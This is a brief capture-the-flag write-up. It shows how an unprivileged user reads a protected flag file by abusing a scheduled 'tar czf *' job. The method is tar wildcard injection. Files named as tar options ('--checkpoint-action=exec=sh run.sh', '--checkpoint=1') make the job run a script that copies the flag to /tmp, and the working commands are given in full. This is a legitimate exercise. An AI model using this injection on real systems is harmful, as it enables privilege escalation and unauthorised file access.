	
We find out that there is 2 users (flag and notroot) and we are notroot.

The flag is in /home/flag but we can not read it, and we know that user flag run “/bin/tar czf *” every second from the hint.

We will make user flag to write the flag to another file where we can read it, which is in /tmp. Change the directory to /home/notroot and we use:

```bash
echo 'cat /home/flag/flag_c6b0057b3d798b0.txt > /tmp/flag.txt' > run.sh
echo "" > "--checkpoint-action=exec=sh run.sh"
echo "" > --checkpoint=1
```

```bash
cd /tmp
```

```bash
cat flag.txt
```

Then, we only need to go to /tmp and read flag.txt.
